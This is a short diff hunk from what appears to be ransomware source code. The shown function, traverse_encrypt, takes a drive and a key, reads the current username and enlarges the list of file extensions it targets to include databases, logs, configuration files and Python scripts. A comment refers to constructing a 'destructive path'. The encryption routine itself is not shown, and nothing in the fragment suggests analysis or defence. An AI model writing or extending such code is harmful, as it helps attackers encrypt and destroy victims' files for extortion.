@@ -204,7 +204,8 @@ def traverse_encrypt(drive, key):
         username = os.environ.get('USERNAME') # Try username through enviromental variables
     
     extensions = ('.doc', '.docx', '.pdf', '.txt', '.odt', '.rtf', '.xls', '.xlsx', '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif', '.mp3', '.wav', '.mp4', '.avi', 
-                  '.mov', '.zip', '.rar', '.7z', '.tar', '.sql', '.mdb', '.accdb', '.bak', '.iso', '.tar.gz', '.gz', '.sqlite', '.xml', '.json', '.csv')
+                '.mov', '.zip', '.rar', '.7z', '.tar', '.sql', '.mdb', '.accdb', '.bak', '.iso', '.tar.gz', '.gz', '.sqlite', '.xml', '.json', '.csv', '.dat', '.db', 
+                '.log', '.cfg', '.ini', '.py', '.bak', '.yml', '.yaml')
     
     def get_main_dirs(username, drive):
         # Construct dynamic destructive path
